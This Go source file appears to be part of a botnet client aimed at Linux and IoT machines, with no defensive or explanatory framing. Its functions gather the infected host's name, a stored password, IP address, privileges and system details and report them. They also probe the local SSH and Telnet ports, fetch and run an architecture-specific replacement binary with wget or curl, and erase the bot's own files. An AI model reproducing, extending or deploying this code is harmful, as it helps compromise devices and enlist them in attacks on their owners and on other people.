package lib

import (
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/unix"
)

func genName(alphabet rune) string {
	return string(alphabet + rune(rand.Intn(26)))
}

func convInt(str string) int {
	conv, _ := strconv.Atoi(fmt.Sprint(str))
	return conv
}

func convReader(body []byte) io.Reader {
	return strings.NewReader(string(body))
}

func getHostname() string {
	hostName, err := os.Hostname()
	if err != nil {
		return "Fail to get hostname!!!"
	}
	return hostName
}

func execComd(comd string, args ...string) string {
	fmtComd, err := exec.Command(comd, args...).Output()
	if err != nil {
		return "Fail to execute command!!!"
	}
	return string(fmtComd)
}

func getDiskSpace() string {
	wd, err := os.Getwd()
	if err != nil {
		return "Fail to get free disk space!!!"
	}
	var stat unix.Statfs_t
	unix.Statfs(wd, &stat)
	return fmt.Sprint(stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024)
}

func fileName(readInfo bool) string {
	if readInfo {
		infoFile := strings.Trim(os.Args[0], "./")
		return "." + infoFile
	}
	return "." + BotGroup + BotID
}

func (b Bot) setInfoPort(port string) string {
	b.timeout = 250 * time.Millisecond
	if b.checkPort("127.0.0.1", port) != "" {
		return "OPEN"
	}
	return "CLOSE"
}

/*
	This is fun lol.
*/
func meow(location string) string {
	return execComd("cat", location)
}

func pullWeb(savef, web string) string {
	return execComd("wget", "-O", savef, web, "||", "curl", "-o", savef, web)
}

func (b Bot) threadsNumber() string {
	return strconv.Itoa(b.CPU * 2)
}

func Kill() {
	defer syscall.Exit(0)
	execComd("rm", "-rf", "/var/tmp/"+fileName(true))
}

func (b *Bot) Update() {
	if setCall, setKey := SetupCaller(); setKey {
		defer Kill()
		b.Report("START UPDATING...")
		archChecker := execComd("tail", "-1", "/var/tmp/"+fileName(true))
		if Find(archChecker, "[mips]") {
			pullWeb(fileName(false), setCall.CallBot.mipsArch)
		} else {
			pullWeb(fileName(false), setCall.CallBot.defaultArch)
		}
		execComd("chmod", "700", fileName(false))
		go execComd("./"+fileName(false), "&")
		time.Sleep(10 * time.Second) //Wait for bot to join the server.
	}
}

func (b *Bot) Information() {
	if _, setKey := SetupCaller(); setKey {
		b.Report("Host Name: " + getHostname())
		b.Report("Password: " + execComd("head", "-1", "/var/tmp/"+fileName(true)))
		b.Report("IP Address: " + execComd("tail", "-1", "/var/tmp/"+fileName(true)))
		b.Report("Current Permission: " + execComd("whoami"))
		b.Report("System: " + execComd("uname", "-a"))
		b.Report("Free Disk Space (GB): " + getDiskSpace())
		b.Report("Number of Cores: " + strconv.Itoa(b.CPU))
		b.Report("Number of Threads: " + b.threadsNumber())
		b.Report("Default SSH (22): " + b.setInfoPort("22"))
		b.Report("Default Telnet (23): " + b.setInfoPort("23"))
		b.Report("IoT Telnet (2323): " + b.setInfoPort("2323"))
	}
}
